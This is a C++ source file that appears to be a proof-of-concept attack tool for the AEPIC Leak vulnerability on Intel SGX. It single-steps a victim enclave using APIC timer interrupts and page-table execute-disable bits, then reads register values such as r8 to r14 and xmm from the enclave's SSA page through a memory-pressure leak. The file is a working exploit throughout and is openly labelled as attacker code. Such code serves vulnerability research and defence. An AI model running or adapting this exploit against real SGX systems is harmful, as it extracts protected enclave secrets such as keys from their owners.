
#include "aepic_interface.h"
#include "aepic_leak.h"
#include "enclave_u.h"
#include "sgx_urts.h"
#include "utils.h"

extern "C" {
#include "libsgxstep/apic.h"
#include "libsgxstep/config.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
}
#include <algorithm>
#include <array>
#include <cassert>
#include <condition_variable>
#include <ctype.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <fstream>
#include <iostream>
#include <map>
#include <mutex>
#include <pthread.h>
#include <set>
#include <signal.h>
#include <sstream>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <vector>
#include <x86intrin.h>

constexpr bool DEBUG = false;
constexpr bool INFO  = true;

constexpr uint64_t VICTIM_CORE = 1;

// for lab16 ... if you change this without telling me I'll hunt you :p
constexpr double   DEFAULT_SINGLE_STEP_INTERVAL = 160; // @ 3.00GHz
constexpr uint64_t APIC_TIMER_IRQ_VECTOR        = 0xec;

// pmd of the target enclave
static uint64_t *pmd_encl = NULL;

// the address of the ssa page in the target enclave
static char *ssa_page;

// runtime interval, will be adopted to achieve real single steps
static double single_step_interval;

// driver data
static aepic_data data;

// first page fault occured
static bool target_reached      = false;
static bool do_split_page_fault = false;

// counters
static int fault_counter       = 0;
static int aep_counter         = 0;
static int instruction_counter = 0;

static bool readable = false;

size_t encl_size() {
    return data.encl_size;
}

char *encl_base() {
    return (char *)data.encl_base;
}

struct reg_info_t {
    uint64_t line;
    uint64_t start;
    uint64_t end;
};

static std::map<std::string, reg_info_t> reg_infos = {
    { "xmm0", { 2, 8, 12 } },  //
    { "xmm1", { 2, 12, 16 } }, //
    { "line2", { 2, 0, 16 } }, //
    { "rdi", { 62, 0, 2 } },   //
    { "r8", { 62, 2, 4 } },    //
    { "r9", { 62, 4, 6 } },    //
    { "r10", { 62, 6, 8 } },    //
    { "r11", { 62, 8, 10 } },    //
    { "r12", { 62, 10, 12 } }, //
    { "r13", { 62, 12, 14 } }, //
    { "r14", { 62, 14, 16 } }  //
};

struct target_t {

    static std::vector<target_t> targets;
    static uint64_t              current_target;
    static uint64_t              state;

    static std::vector<uint64_t *> enclave_ptes;
    static std::vector<uint64_t>   enclave_offsets;
    static uint64_t                last_progress;

    uint64_t *pte_encl;
    uint64_t  offset;

    struct filter_t {
        uint64_t start, step, stop;

        filter_t() = default;

        filter_t(uint64_t start, uint64_t step, uint64_t stop)
          : start { start }
          , step { step }
          , stop { stop } {
        }

        bool is_active(uint64_t val) const {
            bool step_correct  = step == 1 || (val - start) % step == 0;
            bool start_correct = val >= start;
            bool stop_correct  = val < stop || stop == -1;
            return step_correct && start_correct && stop_correct;
        }

        void print() const {
            printf("[%3lu,%3ld)%+2ld", start, (int64_t)stop, step);
        }
    };

    struct sub_target_t {
        std::string name;
        reg_info_t  reg;

        uint64_t pf_counter;

        filter_t i_filter;
        filter_t pf_filter;
    };

    std::vector<sub_target_t> subs;

    target_t(uint64_t o, sub_target_t st) {
        offset = o;
        subs.push_back(st);
        ASSERT(pte_encl = (uint64_t *)remap_page_table_level(get_page(), PTE));

        // set the page to not executable to get faults
        mark_non_exec();
    }

    void increment_sub_targets_pf_counters() {
        for ( auto &t : subs ) {
            t.pf_counter++;
        }
    }

    std::vector<sub_target_t *> get_sub_target(uint64_t iidx) {
        std::vector<sub_target_t *> found;

        auto it = subs.begin();

        while ( it != subs.end() ) {
            it = std::find_if(it, subs.end(), [&](auto &x) {
                return x.i_filter.is_active(iidx) && x.pf_filter.is_active(x.pf_counter);
            });
            if ( it != subs.end() ) {
                found.push_back(&*it);
                it++;
            }
            else {
                break;
            }
        }
        return found;
    }

    static void add_target(std::vector<std::string> const &strs) {
        if ( strs.size() != 9 ) {
            printf("error wrong format!\n");
            exit(0);
        }
        // "offset,iidx,line,start,end,name"
        char *   current;
        uint64_t offset = std::stoul(strs[1], nullptr, 0);

        auto it = std::find_if(targets.begin(), targets.end(), [&](auto &x) {
            return (x.offset & ~0xfff) == (offset & ~0xfff);
        });

        sub_target_t st;

        auto r = [&](uint64_t i) {
            return std::stoul(strs[i], nullptr, 0);
        };

        st.name      = strs[0];
        st.pf_filter = filter_t(r(2), r(3), r(4));
        st.i_filter  = filter_t(r(5), r(6), r(7));
        st.reg       = reg_infos[strs[8].c_str()];

        st.pf_counter = 0;

        if ( it == targets.end() ) {
            targets.emplace_back(offset, st);
        }
        else {
            it->subs.push_back(st);
        }
        printf("%20s: offset=0x%8lx reg: %s line=%2lu start=%2lu end=%2lu ", st.name.c_str(), offset, strs[8].c_str(),
               st.reg.line, st.reg.start, st.reg.end);
        printf("if=");
        st.i_filter.print();
        printf(" pf=");
        st.pf_filter.print();
        printf("\n");
    }

    static void init() {
        for ( uint64_t i = 0; i < encl_size(); i += 0x1000 ) {
            uint64_t *pte = (uint64_t *)remap_page_table_level(encl_base() + i, PTE);
            if ( pte ) {
                enclave_ptes.push_back(pte);
                enclave_offsets.push_back(i);
                if ( i == 0x9000 ) {
                    printf("correct!\n");
                }
            }
        }
        printf("found %d ptes\n", enclave_ptes.size());
        mark_enclave_exec();
        mark_all_targets_non_exec();
        clear_enclave_accessed();
        last_progress = 0;
    }

    static void mark_enclave_exec() {
        for ( uint64_t *pte : enclave_ptes ) {
            *pte = MARK_NOT_EXECUTE_DISABLE(*pte);
        }
    }

    static void mark_enclave_non_exec() {
        for ( uint64_t *pte : enclave_ptes ) {
            *pte = MARK_EXECUTE_DISABLE(*pte);
        }
    }

    static void mark_all_targets_non_exec() {
        for ( auto &t : targets ) {
            t.mark_non_exec();
        }
    }

    static void mark_all_targets_exec() {
        for ( auto &t : targets ) {
            t.mark_exec();
        }
    }

    static bool was_enclave_accessed() {
        for ( uint64_t *pte : enclave_ptes ) {
            if ( ACCESSED(*pte) ) {
                return true;
            }
        }
        return false;
    }

    static void clear_enclave_accessed() {
        for ( uint64_t *pte : enclave_ptes ) {
            *pte = MARK_NOT_ACCESSED(*pte);
        }
    }

    static std::set<uint64_t> get_accessed_pages() {
        std::set<uint64_t> offsets;
        for ( size_t i = 0; uint64_t * pte : enclave_ptes ) {
            if ( ACCESSED(*pte) ) {
                offsets.insert(enclave_offsets[i]);
            }
            i++;
        }
        return offsets;
    }

    static void set_progress(uint64_t offset) {
        last_progress = offset;
    }

    char *get_page() const {
        return encl_base() + (offset & ~0xFFF);
    }

    void mark_exec() const {
        if constexpr ( DEBUG ) {
            printf("activating target %llx\n", offset);
        }

        *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
    }

    void mark_non_exec() const {
        if constexpr ( DEBUG ) {
            printf("deactivating target %llx\n", offset);
        }
        *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
    }

    bool was_accessed() const {
        return ACCESSED(*pte_encl);
    }

    void mark_non_accessed() const {
        *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
    }

    static void check_progress() {
        // printf("last progress: %llx\n", last_progress);
        if ( last_progress == get_target().offset ) {
            do_split_page_fault = true;
            mark_enclave_exec();
            clear_enclave_accessed();
            if constexpr ( DEBUG ) {
                uint64_t erip_offset = edbgrd_erip() - (uint64_t)encl_base();
                printf("detected split pf @ %llx -> last progress: 0x%llx\n", erip_offset, last_progress);
            }
        }
        if ( last_progress == 0 ) {
            last_progress = get_target().offset;
        }
    }

    static void activate_next_target() {

        // if we are handeling a split pf we don't need logic
        if ( do_split_page_fault ) {
            return;
        }

        if ( state == 0 ) {
            current_target = state;
            target_reached = true;

            mark_enclave_non_exec();
            targets[current_target].mark_exec();

            state++;

            check_progress();
        }
        else if ( state < targets.size() ) {
            current_target = state;
            target_reached = true;

            targets[current_target - 1].mark_non_exec();
            targets[current_target].mark_exec();

            state++;

            check_progress();
        }
        else {
            target_reached = false;

            mark_enclave_exec();
            mark_all_targets_non_exec();

            state = 0;
        }

        instruction_counter = 0;
        clear_enclave_accessed();
    }

    static target_t &get_target() {
        return targets[current_target];
    }
};

__attribute__((visibility("hidden"))) std::vector<target_t> target_t::targets;
__attribute__((visibility("hidden"))) uint64_t              target_t::current_target = 0;
__attribute__((visibility("hidden"))) uint64_t              target_t::state          = 0;

__attribute__((visibility("hidden"))) std::vector<uint64_t *> target_t::enclave_ptes;
__attribute__((visibility("hidden"))) std::vector<uint64_t>   target_t::enclave_offsets;
__attribute__((visibility("hidden"))) uint64_t                target_t::last_progress;

static void *victim_function(void *unsued) {
    set_cpu_mask(1llu << VICTIM_CORE);

    apic_timer_oneshot(APIC_TIMER_IRQ_VECTOR);
    apic_write(APIC_TDCR, APIC_TDR_DIV_1);

    printf("[victim] starting on core %ld\n", VICTIM_CORE);
    ecall_init(global_eid);

    apic_timer_deadline();

    printf("[victim] finished!\n");
    return NULL;
}

extern "C" void *sgx_get_aep();

static void signal_handler(int sig) {

    if ( sig == SIGINT ) {
        stop_execution();

        // mark exec to make progress

        target_t::mark_enclave_exec();

        target_reached = false;
        printf("\nctrl+c handled\n");
    }
    else {
        if constexpr ( INFO ) {
            uint64_t erip_offset = edbgrd_erip() - (uint64_t)encl_base();
            printf("pf 0x%llx -> %llx\r", erip_offset, target_t::last_progress);
            fflush(stdout);
        }

        target_t::activate_next_target();
        single_step_interval = DEFAULT_SINGLE_STEP_INTERVAL;
    }
}

static void single_step() {
    target_t::clear_enclave_accessed();
    *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
    apic_timer_irq((int)single_step_interval);
}

static void handle_target() {
    if ( target_t::get_target().was_accessed() ) {
        // single step

        // clear accessed
        target_t::get_target().mark_non_accessed();
        target_t::set_progress(target_t::get_target().offset);

        // we sucessfully single stepped, reset interval
        single_step_interval = DEFAULT_SINGLE_STEP_INTERVAL;

        // chek if we reached the target instruction

        if ( instruction_counter == 0 ) {
            target_t::get_target().increment_sub_targets_pf_counters();
        }

        auto sub_targets = target_t::get_target().get_sub_target(instruction_counter++);

        if ( !sub_targets.empty() ) {
            // printf(" r8 = ");
            // print_sgx_page_line(ssa_page, st->reg.line, false);

            // okay, this is super high overhead but this seems to work super stable
            // we go back to deadline -> OS happy
            // we switch to hyperhtread of memory pressure thread -> leakage happy
            // we print the leaked data -> we happy
            // switch back to the victim core -> enclave happy
            // and reenable apic & co -> sgx-step & OS happy

            apic_timer_deadline();

            set_cpu_mask(1llu << ATTACKER_LEAKER);
            uint64_t erip_offset = edbgrd_erip() - (uint64_t)encl_base();

            for ( auto &st : sub_targets ) {
                printf("[0x%5lx|dbg: 0x%5lx] %6s[%3lu]+%3lu = ", target_t::get_target().offset, erip_offset,
                       st->name.c_str(), st->pf_counter, instruction_counter - 1);
                cache_line_t cl = leak_line_zero(0, encl_base(), ssa_page - encl_base(), st->reg.line);
                print_line_paritally(st->reg.start, st->reg.end, cl, true, readable);
            }

            // print_sgx_page_line(ssa_page, st->reg.line, false);

            // this is critical, if for some reason (depends on the impl in kernel_leak)
            // a used enclave page is not swapped in, the apic timings are gone and good look!
            aepic_swap_page_in(ssa_page);

            set_cpu_mask(1llu << VICTIM_CORE);

            apic_timer_oneshot(APIC_TIMER_IRQ_VECTOR);

            apic_write(APIC_TDCR, APIC_TDR_DIV_1);
        }
    }
    else {
        // zero step or something else

        // we did a zero step at the current instruction slightly increase the interval and continue
        single_step_interval += 0.3;
    }
}

static void handle_split_pf() {
    auto offsets = target_t::get_accessed_pages();

    if ( offsets.size() > 2 ) {

        if constexpr ( DEBUG ) {
            for ( auto &o : offsets ) {
                printf("AECCESSED %llx\n", o);
            }
        }

        target_t::clear_enclave_accessed();
        target_t::set_progress(0);
        target_t::mark_enclave_non_exec();
        do_split_page_fault = false;
    }
    else {
        // we did a zero step at the current instruction slightly increase the interval and continue
        single_step_interval += 0.3;
    }
}

static void aep_cb_func(void) {

    if ( do_split_page_fault ) {
        handle_split_pf();
    }
    else if ( !target_reached ) {
        return;
    }
    else {
        handle_target();
    }

    aep_counter++;

    single_step();
}

// thanks stack overflow, the other methodes are a joke
static std::vector<std::string> split(const std::string &s, char delim) {
    std::vector<std::string> result;
    std::stringstream        ss(s);
    std::string              item;

    while ( std::getline(ss, item, delim) ) {
        result.push_back(item);
    }

    return result;
}

static pthread_t attacker_thread;

extern "C" void __attribute__((visibility("default"))) stepper_init(bool is_readable, char const *config_file_name) {
    isgx = open("/dev/isgx", O_RDWR);
    if ( isgx < 0 ) {
        printf("[attacker] could not open isgx driver: sudo?\n");
        exit(-1);
    }
    readable = is_readable;

    register_aep_cb(aep_cb_func);
    signal(SIGSEGV, signal_handler);

    // get data, we pass one address inside the enclave ... this can be replaced by PSW changes
    // do this over the driver instead of modifing the PSW
    data = aepic_get_data((char *)get_enclave_base());

    // we currently return the target code address, this can be done by looking at
    // the executable flags of the enclave pages

    std::ifstream targets_file;
    targets_file.open(config_file_name);
    std::string line;

    while ( std::getline(targets_file, line) ) {
        if ( line.starts_with("#") ) {
            continue;
        }
        line.erase(remove_if(line.begin(), line.end(), isspace), line.end());
        target_t::add_target(split(line, ','));
    }

    target_t::init();

    printf("[attacker] ssa  @ 0x%llx\n", data.ssa_address);
    printf("[attacker] base @ 0x%llx\n", data.encl_base);
    printf("[attacker] size    %llu pages\n", data.encl_size / 0x1000);

    printf("[attacker] irq vector 0x%x\n", apic_read(APIC_LVTT));

    ssa_page = (char *)((uint64_t)data.ssa_address & ~0xFFF);

    printf("ssa page: %p\n", ssa_page);

    // print_page_table( get_enclave_base() );
    ASSERT(pmd_encl = (uint64_t *)remap_page_table_level(get_enclave_base(), PMD));

    // threads
    pthread_create(&attacker_thread, 0, attacker_memory_pressure, NULL);
}

extern "C" void __attribute__((visibility("default"))) stepper_destroy() {
    apic_timer_deadline();

    stop_execution();

    pthread_join(attacker_thread, NULL);

    close(isgx);

    printf("[main] finished with %u aep callbacks!\n", aep_counter);
}

int main(int argc, char *argv[]) {

    /*void *stepper = dlopen("./libstepper.so", RTLD_NOW);
    if ( !stepper ) {
        printf("could not find libstepper.so!\n");
    }
    else {
        printf("found libstepper.so!\n");
    }
    exit(0);*/

    sgx_launch_token_t token   = { 0 };
    sgx_status_t       ret     = SGX_ERROR_UNEXPECTED;
    int                updated = 0;

    if ( argc != 4 ) {
        printf("[stepper] usage %s enclave_path readable targets_file\n", argv[0]);
        return -1;
    }

    // Create enclave
    if ( sgx_create_enclave(argv[1], SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL) != SGX_SUCCESS ) {
        printf("Failed to start enclave! sudo /opt/intel/sgx-aesm-service/startup.sh ?\n");
        close(isgx);
        return -1;
    }

    stepper_init(atoi(argv[2]), argv[3]);
    signal(SIGINT, signal_handler);

    // start victim
    victim_function(NULL);

    stepper_destroy();

    // Destroy enclave
    sgx_destroy_enclave(global_eid);

    return 0;
}
